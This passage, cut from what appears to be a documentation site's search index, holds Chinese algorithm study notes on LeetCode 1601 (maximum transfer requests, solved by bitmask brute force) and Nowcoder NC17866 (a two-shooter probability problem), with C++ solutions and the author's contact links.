\u3002 \u6211\u4eec\u53ef\u4ee5\u6ee1\u8db3\u6240\u6709\u7684\u8bf7\u6c42\u3002 1.7. Notes # 1 <= n <= 20 1 <= requests.length <= 16 requests[i].length == 2 0 <= from_i, to_i < n 1.8. Source # LeetCode 1601 \u6700\u591a\u53ef\u8fbe\u6210\u7684\u6362\u697c\u8bf7\u6c42\u6570\u76ee 2. \u89e3\u8bfb # \u72b6\u6001\u538b\u7f29\uff0c\u66b4\u529b\u6c42\u89e3\u3002\u7531\u4e8e 1 <= requests.length <= 16 \uff0c\u6240\u6709\u7684\u8bf7\u6c42\u7ec4\u5408\u60c5\u51b5\u53ea\u6709 [0, (1 << 16) - 1] \u4e5f\u5c31\u662f 65536 \u79cd\u3002\u7528 in \u548c out \u4e24\u4e2a\u6570\u7ec4\u5206\u522b\u5b58\u50a8\u6bcf\u680b\u697c\u8fdb\u51fa\u7684\u4eba\u6570\uff0c\u6700\u540e\u5224\u65ad\u4e24\u8005\u662f\u5426\u76f8\u7b49\uff0c\u82e5\u76f8\u7b49\uff0c\u5219\u8fd4\u56de\u5f53\u524d\u904d\u5386\u7684\u72b6\u6001 state \u4e2d 1 \u7684\u4e2a\u6570\u3002 3. \u4ee3\u7801 # \u4ee3\u7801\u53c2\u8003\u81ea \u4e00\u4f4d\u9898\u53cb\u7684\u9898\u89e3 \u3002 const int MAXN = 20 + 1; class Solution { public: int in[MAXN], out[MAXN]; int pos; int cal(int n, size_t len, size_t state, vector<vector<int>>& requests) { // \u521d\u59cb\u5316 int ans = 0; memset(in, 0, sizeof(in)); memset(out, 0, sizeof(out)); // \u8ba1\u7b97\u8bf7\u6c42 for (size_t i = 0; i < len; i++) { pos = 1 << i; if (state & pos) { in[requests[i][0]]++; out[requests[i][1]]++; ans++; } } // \u5224\u65ad for (int i = 0; i < n + 1; i++) { if (in[i] != out[i]) { return 0; } } return ans; } int maximumRequests(int n, vector<vector<int>>& requests) { int ans = 0; size_t len = requests.size(); for (size_t i = 0; i < (1 << len); i++) { ans = max(ans, cal(n, len, i, requests)); } return ans; } }; \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"4.LeetCode 1601 \u6700\u591a\u53ef\u8fbe\u6210\u7684\u6362\u697c\u8bf7\u6c42\u6570\u76ee"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/4.LeetCode_1601_%E6%9C%80%E5%A4%9A%E5%8F%AF%E8%BE%BE%E6%88%90%E7%9A%84%E6%8D%A2%E6%A5%BC%E8%AF%B7%E6%B1%82%E6%95%B0%E7%9B%AE/#leetcode-1601","text":"","title":"LeetCode 1601 \u6700\u591a\u53ef\u8fbe\u6210\u7684\u6362\u697c\u8bf7\u6c42\u6570\u76ee"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/4.LeetCode_1601_%E6%9C%80%E5%A4%9A%E5%8F%AF%E8%BE%BE%E6%88%90%E7%9A%84%E6%8D%A2%E6%A5%BC%E8%AF%B7%E6%B1%82%E6%95%B0%E7%9B%AE/#_1","text":"LeetCode 1601 \u6700\u591a\u53ef\u8fbe\u6210\u7684\u6362\u697c\u8bf7\u6c42\u6570\u76ee \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Sample Input 1 1.4. Sample Output 1 1.5. Sample Input 2 1.6. Sample Output 2 1.7. Notes 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/4.LeetCode_1601_%E6%9C%80%E5%A4%9A%E5%8F%AF%E8%BE%BE%E6%88%90%E7%9A%84%E6%8D%A2%E6%A5%BC%E8%AF%B7%E6%B1%82%E6%95%B0%E7%9B%AE/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/4.LeetCode_1601_%E6%9C%80%E5%A4%9A%E5%8F%AF%E8%BE%BE%E6%88%90%E7%9A%84%E6%8D%A2%E6%A5%BC%E8%AF%B7%E6%B1%82%E6%95%B0%E7%9B%AE/#11-limit","text":"Time Limit: 2000 ms Memory Limit: 131072 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/4.LeetCode_1601_%E6%9C%80%E5%A4%9A%E5%8F%AF%E8%BE%BE%E6%88%90%E7%9A%84%E6%8D%A2%E6%A5%BC%E8%AF%B7%E6%B1%82%E6%95%B0%E7%9B%AE/#12-problem-description","text":"\u6211\u4eec\u6709 n \u680b\u697c\uff0c\u7f16\u53f7\u4ece 0 \u5230 n - 1 \u3002\u6bcf\u680b\u697c\u6709\u82e5\u5e72\u5458\u5de5\u3002\u7531\u4e8e\u73b0\u5728\u662f\u6362\u697c\u7684\u5b63\u8282\uff0c\u90e8\u5206\u5458\u5de5\u60f3\u8981\u6362\u4e00\u680b\u697c\u5c45\u4f4f\u3002 \u7ed9\u4f60\u4e00\u4e2a\u6570\u7ec4 requests \uff0c\u5176\u4e2d requests[i] = [from_i, to_i] \uff0c\u8868\u793a\u4e00\u4e2a\u5458\u5de5\u8bf7\u6c42\u4ece\u7f16\u53f7\u4e3a from_i \u7684\u697c\u642c\u5230\u7f16\u53f7\u4e3a to_i \u7684\u697c\u3002 \u4e00\u5f00\u59cb \u6240\u6709\u697c\u90fd\u662f\u6ee1\u7684\uff0c\u6240\u4ee5\u4ece\u8bf7\u6c42\u5217\u8868\u4e2d\u9009\u51fa\u7684\u82e5\u5e72\u4e2a\u8bf7\u6c42\u662f\u53ef\u884c\u7684\u9700\u8981\u6ee1\u8db3 \u6bcf\u680b\u697c\u5458\u5de5\u51c0\u53d8\u5316\u4e3a 0 \u3002\u610f\u601d\u662f\u6bcf\u680b\u697c \u79bb\u5f00 \u7684\u5458\u5de5\u6570\u76ee \u7b49\u4e8e \u8be5\u697c \u642c\u5165 \u7684\u5458\u5de5\u6570\u6570\u76ee\u3002\u6bd4\u65b9\u8bf4 n = 3 \u4e14\u4e24\u4e2a\u5458\u5de5\u8981\u79bb\u5f00\u697c 0 \uff0c\u4e00\u4e2a\u5458\u5de5\u8981\u79bb\u5f00\u697c 1 \uff0c\u4e00\u4e2a\u5458\u5de5\u8981\u79bb\u5f00\u697c 2 \uff0c\u5982\u679c\u8be5\u8bf7\u6c42\u5217\u8868\u53ef\u884c\uff0c\u5e94\u8be5\u8981\u6709\u4e24\u4e2a\u5458\u5de5\u642c\u5165\u697c 0 \uff0c\u4e00\u4e2a\u5458\u5de5\u642c\u5165\u697c 1 \uff0c\u4e00\u4e2a\u5458\u5de5\u642c\u5165\u697c 2 \u3002 \u8bf7\u4f60\u4ece\u539f\u8bf7\u6c42\u5217\u8868\u4e2d\u9009\u51fa\u82e5\u5e72\u4e2a\u8bf7\u6c42\uff0c\u4f7f\u5f97\u5b83\u4eec\u662f\u4e00\u4e2a\u53ef\u884c\u7684\u8bf7\u6c42\u5217\u8868\uff0c\u5e76\u8fd4\u56de\u6240\u6709\u53ef\u884c\u5217\u8868\u4e2d\u6700\u5927\u8bf7\u6c42\u6570\u76ee\u3002","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/4.LeetCode_1601_%E6%9C%80%E5%A4%9A%E5%8F%AF%E8%BE%BE%E6%88%90%E7%9A%84%E6%8D%A2%E6%A5%BC%E8%AF%B7%E6%B1%82%E6%95%B0%E7%9B%AE/#13-sample-input-1","text":"\u8f93\u5165\uff1an = 5, requests = [[0,1],[1,0],[0,1],[1,2],[2,0],[3,4]]","title":"1.3. Sample Input 1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/4.LeetCode_1601_%E6%9C%80%E5%A4%9A%E5%8F%AF%E8%BE%BE%E6%88%90%E7%9A%84%E6%8D%A2%E6%A5%BC%E8%AF%B7%E6%B1%82%E6%95%B0%E7%9B%AE/#14-sample-output-1","text":"\u8f93\u51fa\uff1a5 \u89e3\u91ca\uff1a\u8bf7\u6c42\u5217\u8868\u5982\u4e0b\uff1a \u4ece\u697c 0 \u79bb\u5f00\u7684\u5458\u5de5\u4e3a x \u548c y \uff0c\u4e14\u4ed6\u4eec\u90fd\u60f3\u8981\u642c\u5230\u697c 1 \u3002 \u4ece\u697c 1 \u79bb\u5f00\u7684\u5458\u5de5\u4e3a a \u548c b \uff0c\u4e14\u4ed6\u4eec\u5206\u522b\u60f3\u8981\u642c\u5230\u697c 2 \u548c 0 \u3002 \u4ece\u697c 2 \u79bb\u5f00\u7684\u5458\u5de5\u4e3a z \uff0c\u4e14\u4ed6\u60f3\u8981\u642c\u5230\u697c 0 \u3002 \u4ece\u697c 3 \u79bb\u5f00\u7684\u5458\u5de5\u4e3a c \uff0c\u4e14\u4ed6\u60f3\u8981\u642c\u5230\u697c 4 \u3002 \u6ca1\u6709\u5458\u5de5\u4ece\u697c 4 \u79bb\u5f00\u3002 \u6211\u4eec\u53ef\u4ee5\u8ba9 x \u548c b \u4ea4\u6362\u4ed6\u4eec\u7684\u697c\uff0c\u4ee5\u6ee1\u8db3\u4ed6\u4eec\u7684\u8bf7\u6c42\u3002 \u6211\u4eec\u53ef\u4ee5\u8ba9 y\uff0ca \u548c z \u4e09\u4eba\u5728\u4e09\u680b\u697c\u95f4\u4ea4\u6362\u4f4d\u7f6e\uff0c\u6ee1\u8db3\u4ed6\u4eec\u7684\u8981\u6c42\u3002 \u6240\u4ee5\u6700\u591a\u53ef\u4ee5\u6ee1\u8db3 5 \u4e2a\u8bf7\u6c42\u3002","title":"1.4. Sample Output 1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/4.LeetCode_1601_%E6%9C%80%E5%A4%9A%E5%8F%AF%E8%BE%BE%E6%88%90%E7%9A%84%E6%8D%A2%E6%A5%BC%E8%AF%B7%E6%B1%82%E6%95%B0%E7%9B%AE/#15-sample-input-2","text":"\u8f93\u5165\uff1an = 3, requests = [[0,0],[1,2],[2,1]]","title":"1.5. Sample Input 2"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/4.LeetCode_1601_%E6%9C%80%E5%A4%9A%E5%8F%AF%E8%BE%BE%E6%88%90%E7%9A%84%E6%8D%A2%E6%A5%BC%E8%AF%B7%E6%B1%82%E6%95%B0%E7%9B%AE/#16-sample-output-2","text":"\u8f93\u51fa\uff1a3 \u89e3\u91ca\uff1a\u8bf7\u6c42\u5217\u8868\u5982\u4e0b\uff1a \u4ece\u697c 0 \u79bb\u5f00\u7684\u5458\u5de5\u4e3a x \uff0c\u4e14\u4ed6\u60f3\u8981\u56de\u5230\u539f\u6765\u7684\u697c 0 \u3002 \u4ece\u697c 1 \u79bb\u5f00\u7684\u5458\u5de5\u4e3a y \uff0c\u4e14\u4ed6\u60f3\u8981\u642c\u5230\u697c 2 \u3002 \u4ece\u697c 2 \u79bb\u5f00\u7684\u5458\u5de5\u4e3a z \uff0c\u4e14\u4ed6\u60f3\u8981\u642c\u5230\u697c 1 \u3002 \u6211\u4eec\u53ef\u4ee5\u6ee1\u8db3\u6240\u6709\u7684\u8bf7\u6c42\u3002","title":"1.6. Sample Output 2"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/4.LeetCode_1601_%E6%9C%80%E5%A4%9A%E5%8F%AF%E8%BE%BE%E6%88%90%E7%9A%84%E6%8D%A2%E6%A5%BC%E8%AF%B7%E6%B1%82%E6%95%B0%E7%9B%AE/#17-notes","text":"1 <= n <= 20 1 <= requests.length <= 16 requests[i].length == 2 0 <= from_i, to_i < n","title":"1.7. Notes"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/4.LeetCode_1601_%E6%9C%80%E5%A4%9A%E5%8F%AF%E8%BE%BE%E6%88%90%E7%9A%84%E6%8D%A2%E6%A5%BC%E8%AF%B7%E6%B1%82%E6%95%B0%E7%9B%AE/#18-source","text":"LeetCode 1601 \u6700\u591a\u53ef\u8fbe\u6210\u7684\u6362\u697c\u8bf7\u6c42\u6570\u76ee","title":"1.8. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/4.LeetCode_1601_%E6%9C%80%E5%A4%9A%E5%8F%AF%E8%BE%BE%E6%88%90%E7%9A%84%E6%8D%A2%E6%A5%BC%E8%AF%B7%E6%B1%82%E6%95%B0%E7%9B%AE/#2","text":"\u72b6\u6001\u538b\u7f29\uff0c\u66b4\u529b\u6c42\u89e3\u3002\u7531\u4e8e 1 <= requests.length <= 16 \uff0c\u6240\u6709\u7684\u8bf7\u6c42\u7ec4\u5408\u60c5\u51b5\u53ea\u6709 [0, (1 << 16) - 1] \u4e5f\u5c31\u662f 65536 \u79cd\u3002\u7528 in \u548c out \u4e24\u4e2a\u6570\u7ec4\u5206\u522b\u5b58\u50a8\u6bcf\u680b\u697c\u8fdb\u51fa\u7684\u4eba\u6570\uff0c\u6700\u540e\u5224\u65ad\u4e24\u8005\u662f\u5426\u76f8\u7b49\uff0c\u82e5\u76f8\u7b49\uff0c\u5219\u8fd4\u56de\u5f53\u524d\u904d\u5386\u7684\u72b6\u6001 state \u4e2d 1 \u7684\u4e2a\u6570\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/4.LeetCode_1601_%E6%9C%80%E5%A4%9A%E5%8F%AF%E8%BE%BE%E6%88%90%E7%9A%84%E6%8D%A2%E6%A5%BC%E8%AF%B7%E6%B1%82%E6%95%B0%E7%9B%AE/#3","text":"\u4ee3\u7801\u53c2\u8003\u81ea \u4e00\u4f4d\u9898\u53cb\u7684\u9898\u89e3 \u3002 const int MAXN = 20 + 1; class Solution { public: int in[MAXN], out[MAXN]; int pos; int cal(int n, size_t len, size_t state, vector<vector<int>>& requests) { // \u521d\u59cb\u5316 int ans = 0; memset(in, 0, sizeof(in)); memset(out, 0, sizeof(out)); // \u8ba1\u7b97\u8bf7\u6c42 for (size_t i = 0; i < len; i++) { pos = 1 << i; if (state & pos) { in[requests[i][0]]++; out[requests[i][1]]++; ans++; } } // \u5224\u65ad for (int i = 0; i < n + 1; i++) { if (in[i] != out[i]) { return 0; } } return ans; } int maximumRequests(int n, vector<vector<int>>& requests) { int ans = 0; size_t len = requests.size(); for (size_t i = 0; i < (1 << len); i++) { ans = max(ans, cal(n, len, i, requests)); } return ans; } }; \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA/1.%E7%89%9B%E5%AE%A2%E7%BD%91_17866_%E8%B0%81%E6%98%AF%E7%A5%9E%E5%B0%84%E6%89%8B/","text":"\u725b\u5ba2\u7f51 NC17866 \u8c01\u662f\u795e\u5c04\u624b # \u76ee\u5f55 # \u725b\u5ba2\u7f51 NC17866 \u8c01\u662f\u795e\u5c04\u624b \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Title 1.2. Time Limit 1.3. Memory Limit 1.4. Problem Description 1.5. Input 1.6. Output 1.7. Sample Input 1 1.8. Sample Output 1 1.7. Sample Input 2 1.8. Sample Output 2 1.10. Source 2. \u9898\u89e3 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Title # \u725b\u5ba2\u7f51 NC17866 \u8c01\u662f\u795e\u5c04\u624b 1.2. Time Limit # C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2 1.3. Memory Limit # C/C++ 32768K\uff0c\u5176\u4ed6\u8bed\u8a0065536K 1.4. Problem Description # \u6709\u4e00\u5929\uff0cMWH\u7a81\u7136\u6765\u4e86\u5174\u81f4\uff0c\u60f3\u548cCSL\u6bd4\u6bd4\u8c01\u67aa\u6cd5\u597d\u3002\u4e8e\u662f\u4ed6\u4eec\u627e\u6765\u4e86\u4e00\u4e2a\u74f6\u5b50\uff0c\u6bd4\u6bd4\u770b\u8c01\u5148\u6253\u4e2d\u8fd9\u4e2a\u74f6\u5b50\u3002 \u7ed9\u5b9aMWH\u7684\u547d\u4e2d\u7387 \\alpha\\% \u548cCSL\u7684\u547d\u4e2d\u7387 \\beta\\% \u3002 \u4e24\u4eba\u8f6e\u6d41\u5c04\u51fb\uff0cMWH\u5148\u624b\uff0c\u95ee\u8c01\u83b7\u80dc\u7684\u6982\u7387\u5927\uff1f 1.5. Input # \u8f93\u5165\u4e24\u4e2a\u6574\u6570 \\alpha \u548c \\beta \uff0c\u8868\u793aMWH\u548cCSL\u7684\u547d\u4e2d\u7387\u3002 (0 \\leq \\alpha,\\beta \\leq 100) . 1.6. Output # \u82e5MWH\u83b7\u80dc\u7684\u6982\u7387\u5927\uff0c\u5219\u8f93\u51fa\"MWH\"\u3002 \u82e5CSL\u83b7\u80dc\u7684\u6982\u7387\u5927\uff0c\u5219\u8f93\u51fa\"CSL\"\uff0c\u5426\u5219\u8f93\u51fa\"equal\"\u3002 1.7. Sample Input 1 # 100 100 1.8. Sample Output 1 # MWH 1.7. Sample Input 2 # 0 100 1.8. Sample Output 2 # CSL 1.10. Source # \u725b\u5ba2\u7f51 NC17866 \u8c01\u662f\u795e\u5c04\u624b 2. \u9898\u89e3 # \u8f6e\u6b21 \u5148\u624b\u8d62\u7684\u6982\u7387 \u540e\u624b\u8d62\u7684\u6982\u7387 1 \\alpha (1-\\alpha)\\beta 2 (1-\\alpha)(1 - \\beta)\\alpha (1-\\alpha)^2(1 - \\beta)\\beta 3 (1-\\alpha)^2(1 - \\beta)^2\\alpha (1-\\alpha)^3(1 - \\beta)^2\\beta \u5148\u624b\u8d62\u7684\u6982\u7387\u4e3a P(A) = \\sum_{n = 0}^{\\infty} (1-\\alpha)^n(1 - \\beta)^n \\alpha \u540e\u624b\u8d62\u7684\u6982\u7387\u4e3a P(B) = \\sum_{n = 0}^{\\infty} (1-\\alpha)^{n + 1}(1 - \\beta)^n\\beta \u53ef\u4ee5\u8f6c\u5316\u4e3a\u7b49\u6bd4\u6570\u5217\u6c42\u548c\u95ee\u9898 S_n=a_1+a_1q+a_1q^2+...+a_1q^{n-1} qS_n=a_1q+a_1q^2+a_1q^3+...+a_1q^{n} \u4e24\u5f0f\u76f8\u51cf (1-q)S_n = a_1-a_1q^n \u5f97\u5230\u6c42\u548c\u516c\u5f0f S_n = \\frac{a_1(1 - q^{n})}{1-q} \u6c42\u6781\u9650\u5f97 \\lim\\limits_{x \\to \\infin}{S_n} = \\frac{a_1}{1-q} \u5e26\u5165 P(A) \u548c P(B) \u3002 P(A) = \\frac{\\alpha}{1-(1-\\alpha)(1 - \\beta)} P(B) = \\frac{(1 - \\alpha) \\beta}{1-(1-\\alpha)(1 - \\beta)} \u5206\u6bcd\u662f\u4e00\u6837\u7684\uff0c\u6240\u4ee5\u53ea\u6bd4\u8f83\u5206\u5b50 \\alpha \u548c (1 - \\alpha) \\beta \u7684\u5927\u5c0f\u5c31\u53ef\u4ee5\u4e86\u3002 3. \u4ee3\u7801 # #include <iostream> using namespace std; int main() { int x, y; cin >> x >> y; int rateX = x; int rateY = y * (100 - x) / 100; if (rateX == rateY) { cout << \"equal\" << endl; } else if (rateX > rateY) { cout << \"MWH\" << endl; } else { cout << \"CSL\" << endl; } // } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.\u725b\u5ba2\u7f51 17866 \u8c01\u662f\u795e\u5c04\u624b"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA/1.%E7%89%9B%E5%AE%A2%E7%BD%91_17866_%E8%B0%81%E6%98%AF%E7%A5%9E%E5%B0%84%E6%89%8B/#nc17866","text":"","title":"\u725b\u5ba2\u7f51 NC17866 \u8c01\u662f\u795e\u5c04\u624b"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA/1.%E7%89%9B%E5%AE%A2%E7%BD%91_17866_%E8%B0%81%E6%98%AF%E7%A5%9E%E5%B0%84%E6%89%8B/#_1","text":"\u725b\u5ba2\u7f51 NC17866 \u8c01\u662f\u795e\u5c04\u624b \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Title 1.2. Time Limit 1.3. Memory Limit 1.4. Problem Description 1.5. Input 1.6. Output 1.7. Sample Input 1 1.8. Sample Output 1 1.7. Sample Input 2 1.8. Sample Output 2 1.10. Source 2. \u9898\u89e3 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA/1.%E7%89%9B%E5%AE%A2%E7%BD%91_17866_%E8%B0%81%E6%98%AF%E7%A5%9E%E5%B0%84%E6%89%8B/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA/1.%E7%89%9B%E5%AE%A2%E7%BD%91_17866_%E8%B0%81%E6%98%AF%E7%A5%9E%E5%B0%84%E6%89%8B/#11-title","text":"\u725b\u5ba2\u7f51 NC17866 \u8c01\u662f\u795e\u5c04\u624b","title":"1.1. Title"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA/1.%E7%89%9B%E5%AE%A2%E7%BD%91_17866_%E8%B0%81%E6%98%AF%E7%A5%9E%E5%B0%84%E6%89%8B/#12-time-limit","text":"C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2","title":"1.2. Time Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA/1.%E7%89%9B%E5%AE%A2%E7%BD%91_17866_%E8%B0%81%E6%98%AF%E7%A5%9E%E5%B0%84%E6%89%8B/#13-memory-limit","text":"C/C++ 32768K\uff0c\u5176\u4ed6\u8bed\u8a0065536K","title":"1.3. Memory Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA/1.%E7%89%9B%E5%AE%A2%E7%BD%91_17866_%E8%B0%81%E6%98%AF%E7%A5%9E%E5%B0%84%E6%89%8B/#14-problem-description","text":"\u6709\u4e00\u5929\uff0cMWH\u7a81\u7136\u6765\u4e86\u5174\u81f4\uff0c\u60f3\u548cCSL\u6bd4\u6bd4\u8c01\u67aa\u6cd5\u597d\u3002\u4e8e\u662f\u4ed6\u4eec\u627e\u6765\u4e86\u4e00\u4e2a\u74f6\u5b50\uff0c\u6bd4\u6bd4\u770b\u8c01\u5148\u6253\u4e2d\u8fd9\u4e2a\u74f6\u5b50\u3002 \u7ed9\u5b9aMWH\u7684\u547d\u4e2d\u7387 \\alpha\\% \u548cCSL\u7684\u547d\u4e2d\u7387 \\beta\\% \u3002 \u4e24\u4eba\u8f6e\u6d41\u5c04\u51fb\uff0cMWH\u5148\u624b\uff0c\u95ee\u8c01\u83b7\u80dc\u7684\u6982\u7387\u5927\uff1f","title":"1.4. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA/1.%E7%89%9B%E5%AE%A2%E7%BD%91_17866_%E8%B0%81%E6%98%AF%E7%A5%9E%E5%B0%84%E6%89%8B/#15-input","text":"\u8f93\u5165\u4e24\u4e2a\u6574\u6570 \\alpha \u548c \\beta \uff0c\u8868\u793aMWH\u548cCSL\u7684\u547d\u4e2d\u7387\u3002 (0 \\leq \\alpha,\\beta \\leq 100) .","title":"1.5. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA/1.%E7%89%9B%E5%AE%A2%E7%BD%91_17866_%E8%B0%81%E6%98%AF%E7%A5%9E%E5%B0%84%E6%89%8B/#16-output","text":"\u82e5MWH\u83b7\u80dc\u7684\u6982\u7387\u5927\uff0c\u5219\u8f93\u51fa\"MWH\"\u3002 \u82e5CSL\u83b7\u80dc\u7684\u6982\u7387\u5927\uff0c\u5219\u8f93\u51fa\"CSL\"\uff0c\u5426\u5219\u8f93\u51fa\"equal\"\u3002","title":"1.6. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA/1.%E7%89%9B%E5%AE%A2%E7%BD%91_17866_%E8%B0%81%E6%98%AF%E7%A5%9E%E5%B0%84%E6%89%8B/#17-sample-input-1","text":"100 100","title":"1.7. Sample Input 